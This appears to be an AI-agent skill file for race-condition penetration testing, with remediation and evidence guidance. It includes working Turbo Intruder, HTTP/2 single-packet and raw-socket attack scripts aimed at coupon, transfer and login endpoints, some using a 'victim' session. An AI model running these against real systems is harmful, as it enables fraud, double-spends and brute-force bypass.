---
name: race-condition
description: >-
  Race condition and TOCTOU testing for web apps. Use when testing one-time operations, concurrent HTTP abuse, rate-limit bypass, Turbo Intruder gates, HTTP/2 single-packet attacks, and CWE-362-style synchronization gaps.
---

# SKILL: Race Conditions — Testing & Exploitation Playbook

> **AI LOAD INSTRUCTION**: Treat race conditions as **authorization/state integrity** issues: non-atomic read-then-write lets multiple requests observe stale state. Prioritize **one-time** or **balance-like** operations. Combine **parallel transport** (HTTP/1.1 last-byte sync, HTTP/2 single-packet, Turbo Intruder gates) with **application evidence** (duplicate success responses, inconsistent balances, duplicate ledger rows). **Authorized testing only.** Routing note: for business workflows, coupons, inventory, or one-time rewards, start with this skill and cross-load `business-logic-vulnerabilities`.

---

## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `skills/business-logic-vulnerabilities/SKILL.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`../business-logic-vulnerabilities/SKILL.md`).

---

## 13. CONFIRMING THE FINDING — THE TWO-SIDED PROOF

A race condition is the only bug class where the **negative control is mandatory**, not optional.
Every candidate looks like a race; almost none are. The distinguishing evidence is always the same
shape: *the invariant held under sequential requests and broke under concurrent ones.*

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the same sequence **fail** when sent sequentially? | the bug is timing, not missing authorization |
| 2 | Does it **succeed** when N are sent in one packet/frame? | concurrency is the trigger |
| 3 | Is the broken state **durable**? (re-read it after) | the effect persisted — not a transient 200 |
| 4 | Is the state **observable outside the response**? (balance, coupon count, audit log) | server-side truth, not UI echo |
| 5 | Can it be **reproduced on demand** (>50% of attempts)? | reliability separates a finding from a flake |
| 6 | Does it cross a **trust or financial boundary**? | severity: duplicate redemption vs duplicate newsletter signup |

Run each test **three times**: once sequentially (control), once with the race window, once with the
race window but no concurrent trigger. If the control also fails, you have a broken app, not a race.

**State the window.** "N requests in a single TCP packet" or "N requests in one HTTP/2 frame" or
"22 parallel `curl --parallel` with a 40-byte body" — the window is the mechanism and the fix owner
needs it. A bare "race condition" report is unactionable and gets closed as `informational`.

**Durable side effects are the whole finding.** The response body is noise; a duplicated order row,
a negative balance, an over-redemption count, or a second `issued` audit entry is the evidence.
Capture the state *after* the burst, not only the burst itself.

---

## 14. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **sequential control** request/response pair | proves the invariant holds normally — the single most important artefact |
| The **concurrent burst** — raw bytes, frame layout, or tool template with N and the window | lets the fix owner reproduce the exact interleaving |
| The **resulting state read back** from a separate endpoint (`/balance`, `/coupons/used`, DB row) | server truth; the response body alone is insufficient |
| The **hit rate** (e.g. 8/20 attempts) | distinguishes a reliable race from a flake |
| The **timestamped** sequence with connection reuse noted | shows whether keep-alive/pipelining was required |
| For HTTP/2: the **frame diagram** (HEADERS/DATA ordering) | single-packet is a different bug from server-side TOCTOU |
| **Negative control** — non-concurrent attempt shows no break | mandatory; see §13 |
| Cost/impact arithmetic (e.g. 1000 requests → 1000 coupons) | turns a technical break into business impact |

Report the **window and the broken invariant**, not the class: "14 concurrent `POST /redeem` in one
HTTP/2 frame produced 14 redemptions against a `limit: 1` coupon because the check and the decrement
are not in one transaction", never "the endpoint is vulnerable to race conditions".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| Multiple `200 OK` responses but state incremented once | correct behaviour; the endpoint is idempotent |
| Same sequence succeeds sequentially too | missing authorization or a design choice, not a race |
| Failure only under artificial load that also breaks unrelated features | load-induced degradation, not a TOCTOU |
| Client-side double-submit blocked by a spinner | the UI is irrelevant; the API is what matters |
| Duplicate record created by a **retry with the same idempotency key** | idempotency working as designed |
| Break reproduced once, never again in 50 attempts | insufficient evidence; likely a flake |
| Two sessions of the same user performing an allowed action | no boundary crossed |
| Timeout/`502` during the burst | infrastructure response under load, not state corruption |

**The control is not optional.** If you did not run the sequential case, you have not tested for a
race — you have tested for "the server sometimes returns 200".

---

## 15. REMEDIATION REFERENCE

1. **Make check-and-act atomic in the data store** — the only fix that removes the class. A single `UPDATE ... SET used=used+1 WHERE used < limit` (with the affected-row count checked) or a `SELECT ... FOR UPDATE` inside one transaction. Application-level `if` before a separate write is the bug, no matter how small the window.
2. **Enforce the invariant with a database constraint, not just code** — a unique index on `(coupon_id, user_id)`, a `CHECK (balance >= 0)`, or a conditional foreign key. A constraint holds under any interleaving; a race in application code does not.
3. **Use optimistic concurrency with a version column** — `WHERE version = :seen`, reject on 0 rows affected, and return `409` so the client can retry. This converts a silent double-spend into a visible conflict.
4. **Require idempotency keys on state-changing endpoints** — accept a client-generated key, store it with a unique constraint, and return the original result on replay. This is the correct fix for double-submit and retry-driven duplication.
5. **Take a lock with the narrowest scope and the shortest duration** — lock the specific row or key, never a table or a global mutex, and never hold it across an external call. Distributed locks (Redis/etcd) must have a fencing token or they reintroduce the race.
6. **Serialize per-entity, not globally** — partition work by the entity under contention (account id, coupon id) so unrelated traffic is not throttled; a global lock converts a correctness bug into an availability bug.
7. **Do not rely on rate limiting as the fix** — rate limits reduce attempts, they do not remove the window. A single well-timed pair still breaks the invariant.
8. **Make the read that gates the action read the same row the write modifies** — TOCTOU appears when the guard reads a cached, replica, or stale copy while the write hits the primary. Read your own write.
9. **Harden the multi-step business flows** — for order/cart/checkout flows, persist an explicit state machine and reject transitions that are already complete; this closes the workflow-level races that row locks miss.
10. **Add detection for bursts and impossible counts** — alert on N concurrent identical state-changing requests per account, on redemptions exceeding `limit`, and on negative balances; the race may be fixed but the attempt is a signal.
11. **Regression-test with a concurrency harness in CI** — replay the §3/§4 single-packet pattern against every state-changing endpoint on every build; this class regresses whenever a transaction boundary is refactored.

---

---

## 16. EXECUTION PRIMITIVES

Race conditions are proven by **two or more requests in flight simultaneously, producing a state the
sequential order cannot**. Every block ends at a duplicated or bypassed effect, with the sequential
control.

### 17.1 Establish the sequential control first

```bash
HOST="https://target.example"; TOKEN="<session>"
# THE SEQUENTIAL CONTROL: the requests one after another - this is the behaviour the race must beat
curl -sS -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"item":"coupon-1","qty":1}' "$HOST/api/redeem" | head -c 200; echo
curl -sS -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"item":"coupon-1","qty":1}' "$HOST/api/redeem" | head -c 200; echo
# the second sequential attempt must be rejected - record that response, it is the control
# and the state before the test, read from the application
curl -sS -H "Authorization: Bearer $TOKEN" "$HOST/api/wallet" | head -c 200; echo
```

**The sequential control is mandatory.** A race finding without it cannot distinguish a race from a
missing check that any single request would also pass.

### 17.2 Single-packet attack, the reliable primitive

```python
# a single-packet attack sends every request in one TCP read, so they arrive together.
# This is the primitive that beats timing jitter; a threaded loop does not.
import socket, ssl, time

HOST, PORT = "target.example", 443

def build_post(path, body, cookie, host_header):
    return (f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
            f"Cookie: {cookie}\r\nContent-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n{body}")

def single_packet(path, body, cookie, n=20):
    ctx = ssl.create_default_context()
    s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=15), server_hostname=HOST)
    req = build_post(path, body, cookie, HOST)
    # send headers first, with the body's final byte withheld so the server waits
    pre = req[:-1]
    for _ in range(n):
        s.sendall(pre.encode())
    s.sendall(req[-1:].encode())     # the final byte releases all n requests at once
    time.sleep(2)
    data = b""
    s.settimeout(8)
    try:
        while True:
            chunk = s.recv(65535)
            if not chunk: break
            data += chunk
    except Exception:
        pass
    s.close()
    return data.decode(errors="replace")

resp = single_packet("/api/redeem", '{"item":"coupon-1","qty":1}', "session=...", n=20)
import re
codes = re.findall(r"HTTP/1\.1 (\d{3})", resp)
print("responses:", codes.count("200"), "x 200,", codes.count("409") + codes.count("400"), "x rejected")
print("suite payload bytes:", len(resp))
```

**The single-packet technique is the primitive.** A threaded loop's requests arrive milliseconds apart and
usually fail; the withheld-final-byte trick puts every request in one read, which is what makes the race
reproducible.

### 17.3 HTTP/2 and the last-byte variant

```bash
# HTTP/2 multiplexing sends every stream in one connection, which is the cleanest single-packet form
# h2spacex or a purpose-built client; the concept matters more than the tool
python3 - <<'PY'
print("For HTTP/2, open one connection and open N streams, each with the request HEADERS sent")
print("and the final DATA frame withheld; release all data frames in one write.")
print()
print("Build it with a client that exposes frame control (h2spacex, Burp's Turbo Intruder,")
print("or a raw h2 implementation). Record the number of concurrent streams the server accepted.")
PY
# the HTTP/1.1 form with the pipelining caveat
python3 - <<'PY'
print("Pipelining is disabled by most servers; the withheld-byte method above is the practical form.")
print("If the server closes the connection on an incomplete request, reduce n and retry.")
PY
```

**HTTP/2 is cleaner and HTTP/1.1 with the withheld byte is the fallback.** Report which one produced the
race, because the server's concurrency handling differs between the two.

### 17.4 The families of race that matter

```python
# each family has a different verification, and each is a different finding
FAMILIES = {
    "limit overrun":     "redeem a coupon/credit N times when the limit is 1 - verify with a balance read",
    "TOCTOU":            "a file or record is checked then used - verify the two states differ",
    "multi-endpoint":    "two different endpoints each assume the other's check - verify the combined state",
    "partial-construction": "the object exists before it is fully built - verify by reading it mid-flight",
    "session/time":      "two requests update the same record, one overwrites - verify the lost update",
    "single-packet register": "N registrations with the same unique value - verify the row count",
}
for k, v in FAMILIES.items():
    print(f"{k:24} {v}")
print()
print("each family is verified by a DIFFERENT state read - name the read in the report")
```

**Each family needs its own verification read.** A balance, a row count, a record's two states - and the
report must name the read that shows the effect.

### 17.5 Measuring concurrency and proving simultaneity

```python
# measure the window you are exploiting, because it determines whether the race is reproducible
import time, requests, statistics
HOST = "https://target.example"

def timed_post(body, n=1):
    ts = []
    for _ in range(n):
        t0 = time.perf_counter()
        try: requests.post(f"{HOST}/api/redeem", json=body, timeout=20)
        except Exception: pass
        ts.append(time.perf_counter() - t0)
    return ts

seq = timed_post({"item": "coupon-1"}, 5)
print(f"sequential median {statistics.median(seq)*1000:.1f} ms over {len(seq)} requests")
print("the race window is the interval between the CHECK and the WRITE, which is usually <5 ms")
print("if the sequential median is >200 ms, the window is likely a database round trip and the")
print("single-packet attack will need the final byte released with the connection prepared in advance")
print()
print("record: requests sent, requests accepted, and the state read after - the three numbers")
print("that constitute the proof")
```

**The window measurement tells you whether the attack is practical.** A window smaller than the network
jitter is not exploitable by a loop, and the report should say whether the single-packet form was
required.

### 17.6 The end-to-end harness

```bash
python3 - <<'PY'
import socket, ssl, re
HOST, PORT = "target.example", 443
COOKIE = "session=<victim>"
PATH, BODY = "/api/redeem", '{"item":"coupon-1","qty":1}'

def attempt(n):
    ctx = ssl.create_default_context()
    s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=15), server_hostname=HOST)
    req = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\nCookie: {COOKIE}\r\n"
           f"Content-Type: application/json\r\nContent-Length: {len(BODY)}\r\n"
           f"Connection: keep-alive\r\n\r\n{BODY}")
    for _ in range(n): s.sendall(req[:-1].encode())
    s.sendall(req[-1:].encode())
    data = b""
    s.settimeout(6)
    try:
        while True:
            c = s.recv(65535)
            if not c: break
            data += c
    except Exception: pass
    s.close()
    return re.findall(r"HTTP/1\.1 (\d{3})", data.decode(errors="replace"))

print("=== SEQUENTIAL CONTROL ===")
print("  second request must be REJECTED - run it manually and record the code")
print()
print("=== SINGLE-PACKET RACE ===")
codes = attempt(20)
print("  sent 20, 200s:", codes.count("200"), " rejected:", len(codes) - codes.count("200"))
print()
print("=== STATE READ (the proof) ===")
print("  read the balance / row count / record state and compare against the sequential outcome")
print()
print("the finding is: N concurrent requests accepted where the SEQUENTIAL control accepts exactly 1")
print("report the window, the n, and the state read")
PY
```

**Sent, accepted, and the state read.** Three numbers; the sequential control is what makes them a finding.

---

## 17. RELATED SIBLINGS - LOAD TOGETHER

- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) - the logic defects a race amplifies
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) - the multiplexing primitive the HTTP/2 form relies on
- [race-condition](../race-condition/SKILL.md) - this document
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the per-object checks a race can bypass
- [request-smuggling](../request-smuggling/SKILL.md) - the other concurrency-sensitive framing attack

---
